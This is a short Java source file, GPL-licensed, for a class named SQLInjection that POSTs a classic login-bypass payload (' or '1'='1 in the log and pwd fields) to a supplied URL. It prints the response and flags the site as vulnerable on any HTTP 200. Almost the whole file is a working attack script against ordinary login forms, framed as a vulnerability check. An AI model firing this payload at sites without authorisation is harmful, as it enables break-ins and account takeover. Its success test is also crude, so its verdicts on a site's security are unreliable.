/*
<SQL Injection attacks only with http request and the injection, to know if a page is vulnerable.>
    Copyright (C) <2018>  <Alan Kuri>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

import java.net.URL;
import java.lang.String;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;

public class SQLInjection implements Runnable {

    public int FLAG;
    private static final String USER_AGENT = "Mozilla/5.0";
    private static final String POST_PARAMS = "log=' or '1'='1&pwd=' or '1'='1";
    protected String URL;

    public SQLInjection (String POST_URL){
        this.URL = POST_URL;
    }

    public void run(){
        try {
            URL obj = new URL(this.URL);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("User-Agent", USER_AGENT);

            // For POST only - START
            con.setDoOutput(true);
            OutputStream os = con.getOutputStream();
            os.write(POST_PARAMS.getBytes());
            os.flush();
            os.close();
            // For POST only - END

            int responseCode = con.getResponseCode();
            System.out.println("POST Response Code :: " + responseCode);

            if (responseCode == 403 || responseCode == 401 || responseCode == 406 || responseCode == 503) {
                FLAG = 0;
                System.out.println("YOUR SITE IS PROTECTED AGAINST SQL INJECTIONS...");
                Thread.currentThread().interrupt();
            }

            if (responseCode == HttpURLConnection.HTTP_OK) { //success
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                String inputLine;
                StringBuffer response = new StringBuffer();

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // print result
                FLAG = 1;
                System.out.println(response.toString());
            }
        }catch(IOException i){
            System.out.println("Thread SqlInject terminated...");
        }
    }
    public int getFLAG() {
        return FLAG;
    }

}
